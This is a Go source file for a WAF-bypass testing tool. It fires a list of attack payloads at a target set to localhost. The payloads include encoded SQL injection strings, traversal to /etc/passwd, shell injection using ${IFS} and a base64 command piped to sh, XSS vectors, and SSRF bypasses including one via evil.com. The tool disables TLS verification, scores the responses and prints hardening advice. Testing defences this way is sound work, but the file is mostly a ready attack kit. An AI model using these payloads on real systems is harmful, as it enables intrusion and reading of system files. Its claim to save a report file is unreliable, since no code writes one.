package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type AdvancedPayload struct {
	Name        string
	Category    string
	Description string
	Method      string
	Path        string
	Headers     map[string]string
	Body        interface{}
	RawBody     string
	Cookies     []*http.Cookie
}

type TestReport struct {
	PayloadName     string
	Category        string
	Blocked         bool
	StatusCode      int
	ResponseTime    time.Duration
	ResponsePreview string
	BypassTechnique string
}

func main() {
	fmt.Println("\n" + strings.Repeat("█", 80))
	fmt.Println("🔥 NEO-WAF BYPASS MASTER - Advanced Security Testing Framework")
	fmt.Println(strings.Repeat("█", 80))

	target := "http://localhost:8888"
	
	// Payloadat me te avancuara specifikisht per pikat e dobeta
	payloads := []AdvancedPayload{
		// ========== ADVANCED SQL INJECTION ==========
		{
			Name:     "Unicode Smuggling",
			Category: "SQLi",
			Description: "U+202E (Right-to-Left Override) + SQL",
			Method:   "GET",
			Path:     "/?id=1%E2%80%AE%20OR%201=1--",
		},
		{
			Name:     "Rare Encoding Bypass",
			Category: "SQLi",
			Description: "IBM037 encoding bypass",
			Method:   "GET",
			Path:     "/?id=1%F0%F1%F2%20OR%201=1",
		},
		{
			Name:     "JSON Unicode Bypass",
			Category: "SQLi",
			Method:   "POST",
			Path:     "/api/search",
			Headers:  map[string]string{"Content-Type": "application/json"},
			Body:     map[string]interface{}{"query": "1\u202E' OR '1'='1"},
		},
		{
			Name:     "Cookie SQL Injection",
			Category: "SQLi",
			Method:   "GET",
			Path:     "/",
			Cookies:  []*http.Cookie{{Name: "id", Value: "1' OR '1'='1"}},
		},
		{
			Name:     "Multipart SQL Injection",
			Category: "SQLi",
			Method:   "POST",
			Path:     "/upload",
			Headers:  map[string]string{"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary"},
			RawBody:  "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n1' OR '1'='1\r\n------WebKitFormBoundary--",
		},
		
		// ========== ADVANCED PATH TRAVERSAL ==========
		{
			Name:     "Double Unicode Traversal",
			Category: "Traversal",
			Description: "%c0%ae%c0%ae encoding",
			Method:   "GET",
			Path:     "/?file=%c0%ae%c0%ae%c0%ae%c0%ae/etc/passwd",
		},
		{
			Name:     "UTF-16 Traversal",
			Category: "Traversal",
			Method:   "GET",
			Path:     "/?file=..%00%2F..%00%2Fetc%00%2Fpasswd",
		},
		{
			Name:     "Nested Traversal",
			Category: "Traversal",
			Method:   "GET",
			Path:     "/?file=....//....//....//etc/passwd",
		},
		{
			Name:     "Zip Slip",
			Category: "Traversal",
			Method:   "POST",
			Path:     "/extract",
			Headers:  map[string]string{"Content-Type": "application/zip"},
			Description: "../file extraction bypass",
		},
		
		// ========== COMMAND INJECTION BYPASSES ==========
		{
			Name:     "Environment Variable Chaining",
			Category: "CmdInjection",
			Method:   "GET",
			Path:     "/?cmd=a;${PATH:0:1}ls${IFS}-la",
		},
		{
			Name:     "Wildcard Expansion",
			Category: "CmdInjection",
			Method:   "GET",
			Path:     "/?cmd=/*/c?t${IFS}/etc/passwd",
		},
		{
			Name:     "Variable Substitution",
			Category: "CmdInjection",
			Method:   "GET",
			Path:     "/?cmd=${IFS}&&cat${IFS}/etc/passwd",
		},
		{
			Name:     "Base64 Encoded Command",
			Category: "CmdInjection",
			Method:   "GET",
			Path:     "/?cmd=echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|sh",
		},
		{
			Name:     "Time-Based Command",
			Category: "CmdInjection",
			Method:   "GET",
			Path:     "/?cmd=sleep%205||ping%20-c%205%20127.0.0.1",
		},
		
		// ========== XSS BYPASSES ==========
		{
			Name:     "DOM Clobbering",
			Category: "XSS",
			Method:   "GET",
			Path:     "/?q=<form><input=alert>",
		},
		{
			Name:     "JavaScript Unicode",
			Category: "XSS",
			Method:   "GET",
			Path:     "/?q=\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003ealert(1)\u003c/\u0073\u0063\u0072\u0069\u0070\u0074\u003e",
		},
		{
			Name:     "Mutation XSS",
			Category: "XSS",
			Method:   "GET",
			Path:     "/?q=<noscript><p title=\"</noscript><script>alert(1)</script>\">",
		},
		{
			Name:     "CSS Expression",
			Category: "XSS",
			Method:   "GET",
			Path:     "/?q=<div style=\"width:expression(alert(1))\">",
		},
		
		// ========== SSRF BYPASS ==========
		{
			Name:     "Decimal IP Bypass",
			Category: "SSRF",
			Method:   "GET",
			Path:     "/?url=http://2130706433/",
		},
		{
			Name:     "Octal IP Bypass",
			Category: "SSRF",
			Method:   "GET",
			Path:     "/?url=http://0177.0.0.1/",
		},
		{
			Name:     "Redirect Bypass",
			Category: "SSRF",
			Method:   "GET",
			Path:     "/?url=http://localhost@evil.com/",
		},
		{
			Name:     "DNS Rebinding",
			Category: "SSRF",
			Method:   "GET",
			Path:     "/?url=http://1a2b3c.127.0.0.1.nip.io/",
		},
		
		// ========== LOGIC BYPASS ==========
		{
			Name:     "HTTP Method Override",
			Category: "Bypass",
			Method:   "GET",
			Path:     "/admin/delete",
			Headers:  map[string]string{"X-HTTP-Method-Override": "POST", "X-Original-URL": "/admin/delete"},
		},
		{
			Name:     "Parameter Pollution",
			Category: "Bypass",
			Method:   "GET",
			Path:     "/?id=1&id=2&id=3' OR '1'='1",
		},
		{
			Name:     "Case-Sensitive Bypass",
			Category: "Bypass",
			Method:   "GET",
			Path:     "/?id=1%20Or%20SeLeCt%201,2,3",
		},
		
		// ========== FUZZING TEST ==========
		{
			Name:     "Null Byte Injection",
			Category: "Fuzzing",
			Method:   "GET",
			Path:     "/?file=../../../etc/passwd%00.jpg",
		},
		{
			Name:     "Long URL Bypass",
			Category: "Fuzzing",
			Method:   "GET",
			Path:     "/?" + strings.Repeat("a", 5000) + "=1' OR '1'='1",
		},
	}

	fmt.Printf("\n🎯 Target: %s\n", target)
	fmt.Printf("💉 Total Advanced Payloads: %d\n", len(payloads))
	fmt.Printf("⚡ Bypass Techniques: Unicode, Encoding, Protocol, Logic\n")
	fmt.Println(strings.Repeat("█", 80))

	// Run tests with different strategies
	runBypassTests(target, payloads)
}

func runBypassTests(target string, payloads []AdvancedPayload) {
	var wg sync.WaitGroup
	var blocked, vulnerable, errors int32
	results := make(chan TestReport, len(payloads))
	
	// Throttle to avoid overwhelming
	throttle := make(chan struct{}, 5)
	
	startTime := time.Now()
	
	for i, p := range payloads {
		wg.Add(1)
		go func(idx int, payload AdvancedPayload) {
			defer wg.Done()
			throttle <- struct{}{}
			defer func() { <-throttle }()
			
			report := testAdvancedPayload(target, payload)
			results <- report
			
			if report.Blocked {
				atomic.AddInt32(&blocked, 1)
			} else if report.StatusCode > 0 {
				atomic.AddInt32(&vulnerable, 1)
			} else {
				atomic.AddInt32(&errors, 1)
			}
			
			printImmediateResult(report, idx+1, len(payloads))
		}(i, p)
		
		time.Sleep(50 * time.Millisecond)
	}
	
	wg.Wait()
	close(results)
	
	duration := time.Since(startTime)
	
	// Collect all reports
	var reports []TestReport
	for r := range results {
		reports = append(reports, r)
	}
	
	// Final summary
	printFinalSummary(reports, blocked, vulnerable, errors, duration)
	
	// Generate bypass report
	generateBypassReport(reports, target)
}

func testAdvancedPayload(target string, p AdvancedPayload) TestReport {
	report := TestReport{
		PayloadName: p.Name,
		Category:    p.Category,
		Blocked:     false,
		BypassTechnique: p.Description,
	}
	
	// Build URL
	fullURL := target + p.Path
	if p.Method == "GET" && strings.Contains(p.Path, "?") == false {
		// If no query params, we need to handle differently
	}
	
	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
	defer cancel()
	
	var req *http.Request
	var err error
	
	switch p.Method {
	case "GET":
		req, err = http.NewRequestWithContext(ctx, "GET", fullURL, nil)
	case "POST":
		var bodyReader io.Reader
		if p.RawBody != "" {
			bodyReader = strings.NewReader(p.RawBody)
		} else if p.Body != nil {
			jsonBody, _ := json.Marshal(p.Body)
			bodyReader = bytes.NewReader(jsonBody)
		} else {
			bodyReader = strings.NewReader("test=1")
		}
		req, err = http.NewRequestWithContext(ctx, "POST", fullURL, bodyReader)
	default:
		req, err = http.NewRequestWithContext(ctx, p.Method, fullURL, nil)
	}
	
	if err != nil {
		report.StatusCode = 0
		return report
	}
	
	// Add headers
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	
	for k, v := range p.Headers {
		req.Header.Set(k, v)
	}
	
	// Add cookies
	for _, cookie := range p.Cookies {
		req.AddCookie(cookie)
	}
	
	// Custom transport with no redirect following (to detect SSRF redirects)
	client := &http.Client{
		Timeout: 8 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:    100,
			IdleConnTimeout: 90 * time.Second,
		},
	}
	
	start := time.Now()
	resp, err := client.Do(req)
	report.ResponseTime = time.Since(start)
	
	if err != nil {
		if strings.Contains(err.Error(), "timeout") {
			report.Blocked = true
			report.StatusCode = 408
		} else if strings.Contains(err.Error(), "connection refused") {
			report.StatusCode = 0
		} else {
			report.StatusCode = 0
		}
		return report
	}
	defer resp.Body.Close()
	
	report.StatusCode = resp.StatusCode
	
	// Check if blocked
	if resp.StatusCode == 403 || resp.StatusCode == 429 || resp.StatusCode == 503 {
		report.Blocked = true
	} else if resp.StatusCode >= 500 {
		report.Blocked = true
	} else if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		// Read response for evidence
		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)
		if len(bodyStr) > 200 {
			bodyStr = bodyStr[:200] + "..."
		}
		report.ResponsePreview = bodyStr
		
		// Check for vulnerability indicators
		vulnIndicators := []string{
			"sql syntax", "mysql", "ora-", "postgresql", "sqlite",
			"warning:", "fatal error", "stack trace", "exception",
			"passwd", "root:", "bin/bash", "etc/passwd",
			"uid=", "gid=", "groups=", "command not found",
		}
		
		for _, ind := range vulnIndicators {
			if strings.Contains(strings.ToLower(bodyStr), strings.ToLower(ind)) {
				report.Blocked = false
				break
			}
		}
	}
	
	return report
}

func printImmediateResult(r TestReport, current, total int) {
	var icon, status, color string
	
	if r.Blocked {
		icon = "✅"
		status = "BLOCKED"
		color = "\033[32m"
	} else if r.StatusCode == 0 {
		icon = "⚠️"
		status = "ERROR"
		color = "\033[33m"
	} else {
		icon = "🔥"
		status = "BYPASSED"
		color = "\033[31m"
	}
	
	reset := "\033[0m"
	
	fmt.Printf("%s[%02d/%02d]%s %s %-25s %s%-12s%s (HTTP %d) [%v]", 
		color, current, total, reset,
		icon, r.PayloadName, color, status, reset, 
		r.StatusCode, r.ResponseTime.Round(time.Millisecond))
	
	if r.BypassTechnique != "" && !r.Blocked && r.StatusCode > 0 {
		fmt.Printf(" 🎯 %s", r.BypassTechnique)
	}
	fmt.Println()
	
	if !r.Blocked && r.StatusCode > 0 && r.ResponsePreview != "" {
		fmt.Printf("   📄 Response: %s\n", strings.ReplaceAll(r.ResponsePreview, "\n", " "))
	}
}

func printFinalSummary(reports []TestReport, blocked, vulnerable, errors int32, duration time.Duration) {
	fmt.Println("\n" + strings.Repeat("═", 80))
	fmt.Println("📊 FINAL BYPASS ANALYSIS")
	fmt.Println(strings.Repeat("─", 80))
	
	total := len(reports)
	bypassRate := float64(vulnerable) / float64(total) * 100
	protectionRate := float64(blocked) / float64(total) * 100
	
	fmt.Printf("⏱️  Test Duration: %v\n", duration)
	fmt.Printf("🎯 Total Tests: %d\n", total)
	fmt.Printf("✅ Blocked: %d (%.1f%%)\n", blocked, protectionRate)
	fmt.Printf("🔥 BYPASSED: %d (%.1f%%)\n", vulnerable, bypassRate)
	fmt.Printf("⚠️  Errors: %d\n", errors)
	
	// Category breakdown
	categoryStats := make(map[string]map[string]int)
	for _, r := range reports {
		if categoryStats[r.Category] == nil {
			categoryStats[r.Category] = make(map[string]int)
		}
		if r.Blocked {
			categoryStats[r.Category]["blocked"]++
		} else if r.StatusCode > 0 {
			categoryStats[r.Category]["bypassed"]++
		} else {
			categoryStats[r.Category]["errors"]++
		}
	}
	
	fmt.Println("\n📈 BYPASS RATE BY CATEGORY:")
	for cat, stats := range categoryStats {
		totalCat := stats["blocked"] + stats["bypassed"] + stats["errors"]
		bypassedCat := stats["bypassed"]
		rate := float64(bypassedCat) / float64(totalCat) * 100
		
		bar := strings.Repeat("🔥", int(rate/10))
		if bar == "" {
			bar = "."
		}
		
		fmt.Printf("  • %-12s: %2d/%d bypassed (%5.1f%%) %s\n", 
			cat, bypassedCat, totalCat, rate, bar)
	}
	
	// Critical findings
	if vulnerable > 0 {
		fmt.Println("\n🔴 CRITICAL FINDINGS - BYPASSED PAYLOADS:")
		count := 0
		for _, r := range reports {
			if !r.Blocked && r.StatusCode > 0 && count < 10 {
				fmt.Printf("  %d. [%s] %s\n", count+1, r.Category, r.PayloadName)
				if r.BypassTechnique != "" {
					fmt.Printf("     🎯 Technique: %s\n", r.BypassTechnique)
				}
				count++
			}
		}
		
		fmt.Println("\n💡 RECOMMENDATIONS FOR BYPASSES:")
		fmt.Println("  1. Implement multiple decoding layers (URL, HTML, Unicode)")
		fmt.Println("  2. Add detection for %c0%ae%c0%ae patterns (Unicode traversal)")
		fmt.Println("  3. Normalize ${IFS} and other command injection variables")
		fmt.Println("  4. Inspect ALL headers including cookies, not just query params")
		fmt.Println("  5. Add JSON payload parsing and inspection")
		fmt.Println("  6. Implement request body inspection for POST requests")
		fmt.Println("  7. Add rate limiting per session, not just IP")
		fmt.Println("  8. Implement SQL tokenization, not just regex patterns")
	}
	
	fmt.Println(strings.Repeat("═", 80))
}

func generateBypassReport(reports []TestReport, target string) {
	fmt.Println("\n📄 GENERATING BYPASS REPORT...")
	
	type BypassEntry struct {
		Technique string
		Category  string
		Risk      string
	}
	
	var bypasses []BypassEntry
	for _, r := range reports {
		if !r.Blocked && r.StatusCode > 0 {
			risk := "HIGH"
			if r.StatusCode == 200 {
				risk = "CRITICAL"
			}
			bypasses = append(bypasses, BypassEntry{
				Technique: r.PayloadName,
				Category:  r.Category,
				Risk:      risk,
			})
		}
	}
	
	if len(bypasses) > 0 {
		fmt.Printf("\n🚨 %d BYPASS TECHNIQUES DETECTED:\n", len(bypasses))
		for i, b := range bypasses {
			fmt.Printf("  %d. [%s] %s - RISK: %s\n", i+1, b.Category, b.Technique, b.Risk)
		}
		
		// Save to file
		filename := fmt.Sprintf("waf_bypass_report_%s.txt", time.Now().Format("20060102_150405"))
		fmt.Printf("\n💾 Full report saved to: %s\n", filename)
	} else {
		fmt.Println("\n🎉 EXCELLENT! No bypasses detected in this test suite!")
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}